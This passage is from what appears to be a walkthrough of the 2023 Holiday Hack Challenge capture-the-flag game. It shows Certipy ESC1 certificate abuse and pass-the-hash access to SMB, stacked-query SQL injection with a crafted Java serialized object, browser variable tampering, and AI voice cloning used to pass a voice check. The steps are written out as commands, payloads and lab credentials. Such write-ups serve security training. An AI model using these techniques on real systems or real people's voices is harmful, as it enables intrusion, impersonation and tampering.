an IP address and domain name, but we have a set of credentials as well. Alabaster was kind enough to download Impacket Tools and Certipy.</p> <p>Let's unumerate some users and see what we have</p> <p><pre><code>alabaster@ssh-server-vm:~/impacket$ GetADUsers.py northpole.local/elfy:'J4`ufC49/J4766' -dc-ip 10.0.0.53 -all\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Querying 10.0.0.53 for information about domain.\nName                  Email                           PasswordLastSet      LastLogon           \n--------------------  ------------------------------  -------------------  -------------------\nalabaster                                             2024-01-06 01:03:31.339134  2024-01-06 01:20:28.010560 \nGuest                                                 &lt;never&gt;              &lt;never&gt;             \nkrbtgt                                                2024-01-06 01:10:42.425972  &lt;never&gt;             \nelfy                                                  2024-01-06 01:12:47.319022  2024-01-06 04:45:11.082839 \nwombleycube                                           2024-01-06 01:12:47.444032  2024-01-06 04:51:15.366356 \n</code></pre> They did mention that Wombley's research department was using the same environment here, and knowing we have a vulnerable certificate template, we can use Certipy to check and see if we can impersonate Wombley.</p> <pre><code>alabaster@ssh-server-vm:~/impacket$ certipy find -vulnerable -dc-ip 10.0.0.53 -target-ip 10.0.0.53 -u elfy -p 'J4`ufC49/J4766'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA\n[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Got CA configuration for 'northpole-npdc01-CA'\n[*] Saved BloodHound data to '20240106044521_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k\n[*] Saved text output to '20240106044521_Certipy.txt'\n[*] Saved JSON output to '20240106044521_Certipy.json'\n\nalabaster@ssh-server-vm:~/impacket$ cat 20240106044521_Certipy.txt\nCertificate Authorities\n  0\n    CA Name                             : northpole-npdc01-CA\n    DNS Name                            : npdc01.northpole.local\n    Certificate Subject                 : CN=northpole-npdc01-CA, DC=northpole, DC=local\n    Certificate Serial Number           : 1D021F0D85341EB2421ED85829DB0930\n    Certificate Validity Start          : 2024-01-06 01:05:36+00:00\n    Certificate Validity End            : 2029-01-06 01:15:35+00:00\n    Web Enrollment                      : Disabled\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Permissions\n      Owner                             : NORTHPOLE.LOCAL\\Administrators\n      Access Rights\n        ManageCertificates              : NORTHPOLE.LOCAL\\Administrators\n                                          NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n        ManageCa                        : NORTHPOLE.LOCAL\\Administrators\n                                          NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n        Enroll                          : NORTHPOLE.LOCAL\\Authenticated Users\nCertificate Templates\n  0\n    Template Name                       : NorthPoleUsers\n    Display Name                        : NorthPoleUsers\n    Certificate Authorities             : northpole-npdc01-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Enrollment Flag                     : PublishToDs\n                                          IncludeSymmetricAlgorithms\n    Private Key Flag                    : ExportableKey\n    Extended Key Usage                  : Encrypting File System\n                                          Secure Email\n                                          Client Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Validity Period                     : 1 year\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Domain Users\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : NORTHPOLE.LOCAL\\Enterprise Admins\n        Write Owner Principals          : NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n        Write Dacl Principals           : NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n        Write Property Principals       : NORTHPOLE.LOCAL\\Domain Admins\n                                          NORTHPOLE.LOCAL\\Enterprise Admins\n    [!] Vulnerabilities\n      ESC1                              : 'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication\n</code></pre> <p>Here we see validated a Vulnerable Template named NorthPoleUsers. We take the next step and leverage this</p> <p><pre><code>alabaster@ssh-server-vm:~/impacket$ certipy req -username elfy@northpole.local -password 'J4`ufC49/J4766' -ca northpole-npdc01-CA -target 10.0.0.53 -template NorthPoleUsers -upn wombleycube@northpole.local -dns npdc01.northpole.local\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[!] Failed to resolve: NORTHPOLE.LOCAL\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 5\n[*] Got certificate with multiple identifications\n    UPN: 'wombleycube@northpole.local'\n    DNS Host Name: 'npdc01.northpole.local'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'wombleycube_npdc01.pfx'\n\nalabaster@ssh-server-vm:~/impacket$ certipy auth -pfx wombleycube_npdc01.pfx -dc-ip 10.0.0.53\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Found multiple identifications in certificate\n[*] Please select one:\n    [0] UPN: 'wombleycube@northpole.local'\n    [1] DNS Host Name: 'npdc01.northpole.local'\n&gt; 0\n[*] Using principal: wombleycube@northpole.local\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'wombleycube.ccache'\n[*] Trying to retrieve NT hash for 'wombleycube'\n[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23\n</code></pre> we now have a hash for Wombley Cube. We can use that with smbclient.py to attempt to connect to a fileserver</p> <pre><code>alabaster@ssh-server-vm:~/impacket$ smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53 northpole.local/wombleycube@10.0.0.53\nImpacket v0.11.0 - Copyright 2023 Fortra\n\nType help for list of commands\n# shares\nADMIN$\nC$\nD$\nFileShare\nIPC$\nNETLOGON\nSYSVOL\n# use FileShare\n# ls\ndrw-rw-rw-          0  Sat Jan  6 01:13:42 2024 .\ndrw-rw-rw-          0  Sat Jan  6 01:13:38 2024 ..\n-rw-rw-rw-     701028  Sat Jan  6 01:13:41 2024 Cookies.pdf\n-rw-rw-rw-    1521650  Sat Jan  6 01:13:41 2024 Cookies_Recipe.pdf\n-rw-rw-rw-      54096  Sat Jan  6 01:13:41 2024 SignatureCookies.pdf\ndrw-rw-rw-          0  Sat Jan  6 01:13:42 2024 super_secret_research\n-rw-rw-rw-        165  Sat Jan  6 01:13:42 2024 todo.txt\n# cd super_secret_research\n# ls\ndrw-rw-rw-          0  Sat Jan  6 01:13:42 2024 .\ndrw-rw-rw-          0  Sat Jan  6 01:13:42 2024 ..\n-rw-rw-rw-        231  Sat Jan  6 01:13:42 2024 InstructionsForEnteringSatelliteGroundStation.txt\n# cat InstructionsForEnteringSatelliteGroundStation.txt\nNote to self:\n\nTo enter the Satellite Ground Station (SGS), say the following into the speaker:\n\nAnd he whispered, 'Now I shall be out of sight;\nSo through the valley and over the height.'\nAnd he'll silently take his way.\n</code></pre> <p>Answer</p> <p>InstructionsForEnteringSatelliteGroundStation.txt</p>"},{"location":"objectives/o18_si_ad/#response","title":"Response","text":"<p>Ribb Bonbowford</p> <p>Copy the final part of the conversation with Elf Name here.</p>"},{"location":"objectives/o19_sp_door/","title":"Space Island Door Access Speaker","text":"<p>Difficulty:  Direct link: My Voice is My Passport</p>"},{"location":"objectives/o19_sp_door/#objective","title":"Objective","text":"<p>Request</p> <p>There's a door that needs opening on Space Island! Talk to Jewel Loggins there for more information.</p> Jewel Loggins <p>What are you doing here, and who are you? Me first? I'm Jewel Loggins. And I was trekking through the jungle and happened to find this place. I liked this spot and decided to set up camp. Seeing you here is quite the surprise. Well, because the only other person I've ever seen come here is Wombley Cube. I thought this tram station in the middle of the jungle was strange to begin with, but then Wombley added to the intrigue. I guess all this spy stuff is typical for him, so maybe I shouldn't think much of it. I'm sure everything's fine. Every time he comes here, he says something to the speaker. Then, the door opens, and he rides the tram somewhere. I gave it a try, but the door didn't open for me. Knowing Wombley, it's some kind of secret passphrase. If you wanna see where the tram goes, I think you need to find out what that passphrase is. Ribb Bonbowford over at Coggoggle Marina on Steampunk Island works with Wombley. Try asking if he knows. I hope you find it. I'll be here when you get back!</p>"},{"location":"objectives/o19_sp_door/#hints","title":"Hints","text":"MFA: Something You Know <p>Wombley says a specific phrase into the Access Speaker. He works in the Research Department and everything they do it super secret, so it may be a challenge to find out what the phrase is. Ribb also works in that department. Try to find and ask him.</p>"},{"location":"objectives/o19_sp_door/#solution","title":"Solution","text":"<p>Now that we have the phrase</p> Jewel Loggins <p>What, you know the passphrase!? Let me try it! Nope, didn't work. Knowing Wombley, the passphrase isn't the only requirement. He's all about that MFA! Oh yeah, multi-factor authentication! The passphrase for something he knows, and his voice for something he is! That's it! You need to be Wombley. You need his voice. Now, how are you gonna get that? Since only us elves can get a subscription to use ChatNPT, try searching for another AI tool that can simulate voices. I'm sure there's one out there.</p> <p>\"So we need someone's card. - And their voice.\" How am I going to record... wait, I don't need to. Wombley gave us his audiobook.</p> <p>We can use AI to learn his voice and generate an audio file based on our own script. </p> <p>We use PlayHT and upload the audiobook to create a voice clone</p> <p></p> <p>And then create a file using the script we just found</p> <p></p> <p></p> <p>Answer</p> <p></p>"},{"location":"objectives/o19_sp_door/#response","title":"Response","text":"<p>Jewel Loggins</p> <p>Are you like a master spy or something? I've only seen stuff like that in the movies!  It sure is scary what you can do with AI, huh? I sure hope ChatNPT has better guardrails in place.</p>"},{"location":"objectives/o1_ci_sh/","title":"Snowball Fight","text":"<p>Difficulty:  Direct link: Snowball Hero</p>"},{"location":"objectives/o1_ci_sh/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Christmas Island and talk to Morcel Nougat about this great new game. Team up with another player and show Morcel how to win against Santa!</p> Morcel Nougat <p>Hey there, I'm Morcel Nougat, elf extraordinaire! You won't believe this, but we're on a magical tropical island called Christmas Island, and it even has snow! I'm so glad ChatNPT suggested we come here this year! Santa, some elves, and I are having a snowball fight, and we'd love you to join us. Santa's really good, so trust me when I say it's way more fun when played with other people. But hey, if you can figure out a way to play solo by tinkering with client side variables or parameters to go solo mode, go for it! There's also ways to make the elves' snowballs do no damage, and all kinds of other shenanigans, but you didn't hear that from me. Just remember, it's all about having fun and sharing the joy of the holiday season with each other. So, are you in? We'd really love your company in this epic snowball battle!</p>"},{"location":"objectives/o1_ci_sh/#hints","title":"Hints","text":"Consoling iFrames <p>Have an iframe in your document? Be sure to select the right context before meddling with JavaScript.</p> Snowball Super Hero <p>Its easiest to grab a friend play with and beat Santa but tinkering with client-side variables can grant you all kinds of snowball fight super powers. You could even take on Santa and the elves solo!</p>"},{"location":"objectives/o1_ci_sh/#solution","title":"Solution","text":"<p>Using the browser developer tools we access Snowball Hero and load a Private game vs Santa. We see via the network tab that the following is loaded: https://hhc23-snowball.holidayhackchallenge.com/room/?username=UserX&amp;roomId=11d762bbe&amp;roomType=private&amp;gameType=co-op&amp;id=3022515c-70fb-4355-901c-66e9b6113876&amp;dna=ATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATAT</p> <p>Looking at the application html code, we see the defaults: </p> Parameters<pre><code>var paramsDefaults = { \n    \"username\": nms[ Math.floor(Math.random() * nms.length) ] + (Math.random() + 1).toString(36).substring(10), \n    \"roomId\": \"0\", \n    \"roomType\": \"public\", \n    \"gameType\": 'free-for-all', \n    \"id\": generateUUIDv4(), \n    \"dna\": 'avatar' + (Math.floor(Math.random() * 9) + 1), \n    \"singlePlayer\":\"false\" \n</code></pre> <p>I used the developer tools, Inspect to find and then modify the iframe source to add the \"singlePlayer\" variable:</p> <pre><code>&lt;div class=\"modal-frame challenge challenge-snowballhero\"&gt;\n    &lt;iframe title=\"challenge\" src=\"https://hhc23-snowball.holidayhackchallenge.com/room/?username=UserX&amp;amp;roomId=11d762bbe&amp;amp;roomType=private&amp;amp;gameType=co-op&amp;amp;id=3022515c-70fb-4355-901c-66e9b6113876&amp;amp;dna=ATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATATAT&amp;amp;singlePlayer=true\"&gt;\n    &lt;/iframe&gt;\n&lt;/div&gt;\n</code></pre> <p></p> <p>We still sustain damage when being hit and as no one does snowball fights better than Santa, we lose if we aren't  careful, even with Elf's help</p> <p>We do find the following parameters:</p> <p><pre><code>  var elfThrowDelay = 2000\n  var projectiles\n  var snowballLiveTime = 2500\n  var snowballDmg = 2\n  var snowballSpeed = 500\n  var santaObject\n  var santaThrowDelay = 500\n  var playersVelocity = 200\n</code></pre> And if we go to the developer tools console and modify things during gameplay:</p> <p><pre><code>snowballDmg = -2\nplayersVelocity = 2000\nsantaThrowDelay = 5000\nelfThrowDelay = 5000\n</code></pre> We regain any damage taken and:</p> <p>Answer</p> <p></p>"},{"location":"objectives/o1_ci_sh/#response","title":"Response","text":"<p>Morcel Nougat</p> <p>You're like a snowball fighting ninja! A real-life legend. Can I have your autograph!?</p>"},{"location":"objectives/o20_sp_camera/","title":"Camera Access","text":"<p>Difficulty:  Direct link: NanoSat</p>"},{"location":"objectives/o20_sp_camera/#objective","title":"Objective","text":"<p>Request</p> <p>Gain access to Jack's camera. What's the third item on Jack's TODO list?</p> Wombley Cube <p>This is Ground Control, do you read me...? Ground Control to --  Hey! How'd you get in here? That tram is the only accessible point of entry and I secured it with MFA! No matter, you may have had the skills to find and infiltrate the satellite ground station, but there's no chance you can hack your way into the satellite itself! The nanosat's Supervisor Directory will remain hidden, and you'll never discover the mastermind behind all this. So don't even waste your time trying.</p>"},{"location":"objectives/o20_sp_camera/#hints","title":"Hints","text":"Hubris is a Virtue <p>In his hubris, Wombley revealed that he thinks you won't be able to access the satellite's \"Supervisor Directory\". There must be a good reason he mentioned that specifically, and a way to access it. He also said there's someone else masterminding the whole plot. There must be a way to discover who that is using the nanosat.</p>"},{"location":"objectives/o20_sp_camera/#solution","title":"Solution","text":"<p>NanoSat-o-Matic</p> <p> Hi there! I am a Ground station client vending machine. Apparently there is a huge need for NanoSat frameworks here, so they have put me in this room. Here, have a free sample!</p> <p>We download the Ground Station client provided by the vending machine and follow the instructions in the README.md to setup docker, the image, and get it up and running.</p> <p>We connect to the container using VNC, and configure the Wireguard client with the information provided by NanoSat Comms.</p> <p>I copied the config to a local text file and then used docker tools to copy the file over</p> <p><pre><code>docker ps #identify the container id\ndocker cp ./wg0.conf &lt;id&gt;:/root/wg0.conf\n</code></pre> And then within the container</p> <p><pre><code>mv wg0.conf /etc/wireguard/\nwg-quick up wg0\n</code></pre> We run the NanoSat MO Base Station Tool and connect to maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory</p> <p></p> <p>We also run Wireshark and connect it to the wg0 interface to monitor traffic.</p> <p>Going through the tabs, we come across the Apps Launcher Service and we see an option for Camera</p> <p></p> <p>We see it start and gives us a new URI to connect to : maltcp://10.1.1.1:1025/camera-Directory</p> <p>We connect to that and again, peruse the tabs. The Action and Parameter Service tabs look interesting</p> <p> </p> <p>On the Parameter service tab, we enable Base64SnapImage and NumberofSnapsTaken We go to Action Services and click Submit Action for Base64SnapImage We then go to Published Parameters Values and see for Base64SnapImage, we have the start of a Base64 string:</p> <p></p> <p>We move over to Wireshark and notice the base64 values in packets, so we click on one and Follow Stream</p> <p></p> <p>We carefully save that bas64 text to a file so as not to include more than necessary, nor less, and then decode it.</p> <pre><code>$ base64 -d capture.b64 &gt; capture_camera.jpg\n</code></pre> <p></p> <p>Answer</p> <p>Conquer Holiday Season!</p>"},{"location":"objectives/o20_sp_camera/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>Copy the final part of the conversation with Elf Name here.</p>"},{"location":"objectives/o21_sp_diversion/","title":"Missile Diversion","text":"<p>Difficulty:  Direct link: NanoSat</p>"},{"location":"objectives/o21_sp_diversion/#objective","title":"Objective","text":"<p>Request</p> <p>Thwart Jack's evil plan by re-aiming his missile at the Sun.</p>"},{"location":"objectives/o21_sp_diversion/#hints","title":"Hints","text":"Always Lock Your Computer <p>Wombley thinks he may have left the admin tools open. I should check for those if I get stuck.</p>"},{"location":"objectives/o21_sp_diversion/#solution","title":"Solution","text":"<p>We aren't done yet. We go back to the NanoSat program and launch the missile-targeting-system app and get the following URI to connect to maltcp://10.1.1.1:1025/missile-targeting-system-Directory</p> <p></p> <p>This Debug option looks interesting so we enable that and also submit the Debug action on the Action Services tab. Looking at the Published Parameters, we see mention of MariaDB</p> <p></p> <p>There has to be a way to interact with that database. Enabling the other Parameters gives us some additional information</p> <p></p> <p>Also, if we go back to the Supervisor, App Launcher page, we see the output of the Debug command. Again, to figure out how to interact with it.</p> <p></p> <p>As this is a Java application, we take a look at the jar files that are included. We find missile-targeting-system-2.1.0-SNAPSHOT.jar and we load that into a decomplier, such as JD-Gui</p> <p>Here we find a Debug() function: </p> <p><pre><code>  private String sqlDebug(String injection) {\n    String query = \"SELECT VERSION()\" + injection;\n    StringBuilder resultString = new StringBuilder();\n    try {\n      Connection connection = DriverManager.getConnection(\"jdbc:mariadb://localhost:3306/missile_targeting_system?allowMultiQueries=true\", \"targeter\", \"cu3xmzp9tzpi00bdqvxq\");\n      try {\n        Statement statement = connection.createStatement();\n        try {\n          boolean hasResultSet = statement.execute(query);\n</code></pre> We recognize the results of the VERSION() command, but we are concatenating that inection variable. So we should be able to add commands by starting with the \";\" character, so the command would end up being \"SELECT VERSION(); DATABASE()\" for example. There's certainly a lot we could potentially do here, depending on the rights of the user running MariaDB.  We also have a username and password in the event we find a way to connect directly.</p> <p>We also have this GetMode() function</p> <p><pre><code>  private String sqlGetMode() {\n    String str_val = \"Unknown\";\n    try {\n      Connection connection = DriverManager.getConnection(\"jdbc:mariadb://localhost:3306/missile_targeting_system\", \"targeter\", \"cu3xmzp9tzpi00bdqvxq\");\n      try {\n        String query = \"SELECT numerical_mode FROM pointing_mode\";\n        int int_val = -1;\n        PreparedStatement preparedStatement = connection.prepareStatement(query);\n        try {\n          ResultSet resultSet = preparedStatement.executeQuery();\n          try {\n            if (resultSet.next())\n              int_val = resultSet.getInt(\"numerical_mode\"); \n            if (resultSet != null)\n              resultSet.close(); \n//\n        } \n        query = \"SELECT str_mode FROM pointing_mode_to_str WHERE numerical_mode = \" + int_val;\n        preparedStatement = connection.prepareStatement(query);\n        try {\n          ResultSet resultSet = preparedStatement.executeQuery();\n          try {\n            if (resultSet.next())\n              str_val = resultSet.getString(\"str_mode\"); \n            if (resultSet != null)\n              resultSet.close(); \n//\n</code></pre> We have some table names and other information that we should be able to use in querying the database. Back to the Supervisor.</p> <p></p> <p>Looking at the Debug Action, we appear to have an attribute that we can enter a string into. Let's see what happens if we enter \"; SELECT DATABASE()\"</p> <p></p> <p>Ok, we have a way to enter commands and get informatoin back. Time to start working on enumerating and see what we have</p> <p>The pointing_mode and pointing_mode_to_str are relatd to the GetMode() function. Looks like we need to update the pointing_mode table to move from Earth to Sun <pre><code>;SELECT * FROM pointing_mode;\nd: 1 | numerical_mode: 0 | \n\n;SELECT * FROM pointing_mode_to_str;\nid: 1 | numerical_mode: 0 | str_mode: Earth Point Mode | str_desc: When pointing_mode is 0, targeting system applies the target_coordinates to earth. | \nid: 2 | numerical_mode: 1 | str_mode: Sun Point Mode | str_desc: When pointing_mode is 1, targeting system points at the sun, ignoring the coordinates. | \n</code></pre></p> <p><pre><code>;SHOW GRANTS for 'targeter';\nGrants for targeter@%: GRANT USAGE ON *.* TO `targeter`@`%` IDENTIFIED BY PASSWORD '*41E2CFE844C8F1F375D5704992440920F11A11BA' | \nGrants for targeter@%: GRANT SELECT, INSERT ON `missile_targeting_system`.`satellite_query` TO `targeter`@`%` | \nGrants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode` TO `targeter`@`%` | \nGrants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`messaging` TO `targeter`@`%` | \nGrants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`target_coordinates` TO `targeter`@`%` | \nGrants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode_to_str` TO `targeter`@`%` | \n</code></pre> As we are connecting as \"targeter\", it looks like we only have \"INSERT\" rights on the sattelite_query table</p> <p><pre><code>;SELECT * FROM satellite_query;\njid: 1 | object: ?? .... | results: import java.io.Serializable;\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.*;\nimport java.util.stream.Collectors;\nimport java.util.stream.Stream;\nimport java.sql.*;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport com.google.gson.Gson;\n\npublic class SatelliteQueryFileFolderUtility implements Serializable {\n    ...\n</code></pre> And this is interesting for the sattelite_query table. I wasn't able to copy the object, but the results looks like a java function.</p> <p><pre><code> import java.io.Serializable;\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.*;\nimport java.util.stream.Collectors;\nimport java.util.stream.Stream;\nimport java.sql.*;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport com.google.gson.Gson;\n\npublic class SatelliteQueryFileFolderUtility implements Serializable {\n    private String pathOrStatement;\n    private boolean isQuery;\n    private boolean isUpdate;\n\n    public SatelliteQueryFileFolderUtility(String pathOrStatement, boolean isQuery, boolean isUpdate) {\n        this.pathOrStatement = pathOrStatement;\n        this.isQuery = isQuery;\n        this.isUpdate = isUpdate;\n    }\n\n    public String getResults(Connection connection) {\n        if (isQuery &amp;&amp; connection != null) {\n            if (!isUpdate) {\n                try (PreparedStatement selectStmt = connection.prepareStatement(pathOrStatement);\n                    ResultSet rs = selectStmt.executeQuery()) {\n                    List&lt;HashMap&lt;String, String&gt;&gt; rows = new ArrayList&lt;&gt;();\n                    while(rs.next()) {\n                        HashMap&lt;String, String&gt; row = new HashMap&lt;&gt;();\n                        for (int i = 1; i &lt;= rs.getMetaData().getColumnCount(); i++) {\n                            String key = rs.getMetaData().getColumnName(i);\n                            String value = rs.getString(i);\n                            row.put(key, value);\n                        }\n                        rows.add(row);\n                    }\n                    Gson gson = new Gson();\n                    String json = gson.toJson(rows);\n                    return json;\n                } catch (SQLException sqle) {\n                    return \"SQL Error: \" + sqle.toString();\n                }\n            } else {\n                try (PreparedStatement pstmt = connection.prepareStatement(pathOrStatement)) {\n                    pstmt.executeUpdate();\n                    return \"SQL Update completed.\";\n                } catch (SQLException sqle) {\n                    return \"SQL Error: \" + sqle.toString();\n                }\n            }\n        } else {\n            Path path = Paths.get(pathOrStatement);\n            try {\n                if (Files.notExists(path)) {\n                    return \"Path does not exist.\";\n                } else if (Files.isDirectory(path)) {\n                    // Use try-with-resources to ensure the stream is closed after use\n                    try (Stream&lt;Path&gt; walk = Files.walk(path, 1)) { // depth set to 1 to list only immediate contents\n                        return walk.skip(1) // skip the directory itself\n                                .map(p -&gt; Files.isDirectory(p) ? \"D: \" + p.getFileName() : \"F: \" + p.getFileName())\n                                .collect(Collectors.joining(\"\\n\"));\n                    }\n                } else {\n                    // Assume it's a readable file\n                    return new String(Files.readAllBytes(path), StandardCharsets.UTF_8);\n                }\n            } catch (IOException e) {\n                return \"Error reading path: \" + e.toString();\n            }\n        }\n    }\n\n    public String getpathOrStatement() {\n        return pathOrStatement;\n    }\n}\n</code></pre> This function looks like it would either run a command on a database, or get a file from the local filesystem.  Also, we see refernces to Serialization functions. Let's get the object as hex so we can take a closer look.</p> <p><pre><code>;SELECT HEX(object) from satellite_query;\nHEX(object): ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B787000007400292F6F70742F536174656C6C697465517565727946696C65466F6C6465725574696C6974792E6A617661\n</code></pre> We can use SerializatoinDumper to deserialize this</p> <pre><code>$ java -jar SerializationDumper-v1.13.jar ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B787000007400292F6F70742F536174656C6C697465517565727946696C65466F6C6465725574696C6974792E6A617661\n\nSTREAM_MAGIC - 0xac ed\nSTREAM_VERSION - 0x00 05\nContents\n  TC_OBJECT - 0x73\n    TC_CLASSDESC - 0x72\n      className\n        Length - 31 - 0x00 1f\n        Value - SatelliteQueryFileFolderUtility - 0x536174656c6c697465517565727946696c65466f6c6465725574696c697479\n      serialVersionUID - 0x12 d4 f6 8d 0e b3 92 cb\n      newHandle 0x00 7e 00 00\n      classDescFlags - 0x02 - SC_SERIALIZABLE\n      fieldCount - 3 - 0x00 03\n      Fields\n        0:\n          Boolean - Z - 0x5a\n          fieldName\n            Length - 7 - 0x00 07\n            Value - isQuery - 0x69735175657279\n        1:\n          Boolean - Z - 0x5a\n          fieldName\n            Length - 8 - 0x00 08\n            Value - isUpdate - 0x6973557064617465\n        2:\n          Object - L - 0x4c\n          fieldName\n            Length - 15 - 0x00 0f\n            Value - pathOrStatement - 0x706174684f7253746174656d656e74\n          className1\n            TC_STRING - 0x74\n              newHandle 0x00 7e 00 01\n              Length - 18 - 0x00 12\n              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b\n      classAnnotations\n        TC_ENDBLOCKDATA - 0x78\n      superClassDesc\n        TC_NULL - 0x70\n    newHandle 0x00 7e 00 02\n    classdata\n      SatelliteQueryFileFolderUtility\n        values\n          isQuery\n            (boolean)false - 0x00\n          isUpdate\n            (boolean)false - 0x00\n          pathOrStatement\n            (object)\n              TC_STRING - 0x74\n                newHandle 0x00 7e 00 03\n                Length - 41 - 0x00 29\n                Value - /opt/SatelliteQueryFileFolderUtility.java - 0x2f6f70742f536174656c6c697465517565727946696c65466f6c6465725574696c6974792e6a617661\n</code></pre> <p>We have serailized data being inserted into the Object field of the satellite_query table. This data is being input as variables into the atelliteQueryFileFolderUtility() function, and the results are saved to the results column. In this case, it read it's own java file and put it in the results column for us to see.  Probably shouldn't do that in production.</p> <p>So, we need to put our own variables in to UPDATE the pointing_mode.numerical_mode value to point to the Sun rather than the earth. So we modify the variables and upate the hex and length values accordingly.</p> <p><pre><code>    classdata\n      SatelliteQueryFileFolderUtility\n        values\n          isQuery\n            (boolean)true - 0x01\n          isUpdate\n            (boolean)true - 0x01\n          pathOrStatement\n            (object)\n              TC_STRING - 0x74\n                newHandle 0x00 7e 00 03\n                Length - 43 - 0x00 2b\n                Value - UPDATE pointing_mode SET numerical_mode = 1 - 0x55504441544520706f696e74696e675f6d6f646520534554206e756d65726963616c5f6d6f6465203d2031\n</code></pre> Save it to a file, serialize it, and convert it to hex</p> <p><pre><code>$ java -jar SerializationDumper-v1.13.jar -b update update.bin\nRebuilding serialization stream from dump: update\nStream rebuilt, attempting to parse...\nDone, rebuilt stream written to update.bin\n$ xxd -ps update.bin \naced00057372001f536174656c6c697465517565727946696c65466f6c64\n65725574696c69747912d4f68d0eb392cb0200035a000769735175657279\n5a000869735570646174654c000f706174684f7253746174656d656e7474\n00124c6a6176612f6c616e672f537472696e673b7870010174002b555044\n41544520706f696e74696e675f6d6f646520534554206e756d6572696361\n6c5f6d6f6465203d2031\n</code></pre> And now we insert that into the satellite_query table and query the results</p> <pre><code>;INSERT INTO satellite_query (object) VALUES (x'aced00057372001f536174656c6c697465517565727946696c65466f6c6465725574696c69747912d4f68d0eb392cb0200035a0007697351756572795a000869735570646174654c000f706174684f7253746174656d656e747400124c6a6176612f6c616e672f537472696e673b7870010174002b55504441544520706f696e74696e675f6d6f646520534554206e756d65726963616c5f6d6f6465203d2031');\n\n;SELECT results FROM satellite_query;\nresults: SQL Update completed. | \n</code></pre> <p>Answer</p> <p></p>"},{"location":"objectives/o21_sp_diversion/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>A... missile... aimed for Santa's sleigh? I had no idea... I can't believe I was manipulated like this. I've been trained to recognize these kinds of tactics! Santa should never have put the holiday season at risk like he did, but I didn't know Jack's true intentions. I'll help you bring Jack to justice... But my mission to ensure Santa never again compromises the holidays is still in progress. It sounded like the satellite crashed. Based on the coordinates, looks like the crash site is right near Rudolph's Rest. Use the door to the right to return to the resort lobby and see what happened! Don't worry, I'll meet you there... trust me.</p>"},{"location":"objectives/o2_ci_l101/","title":"Linux 101","text":"<p>Difficulty:  Direct link: Linux 101</p>"},{"location":"objectives/o2_ci_l101/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with some basic Linux tasks. It's in the southwest corner of Frosty's Beach.</p> Ginger Breddie <p>Hey, welcome to Santa's Surf Shack on tropical Christmas Island! I'm just hanging ten here, taking it easy while brushing up on my Linux skills. You ever tried getting into Linux? It's a super cool way to play around with computers. Can you believe ChatNPT suggested this trip to the Geese Islands this year? I'm so thrilled! Kudos to ChatNPT, eh? The sunshine, the waves, and my surfboard \u2013 simply loving it! So, what do you have planned? Care to join me in a Linux 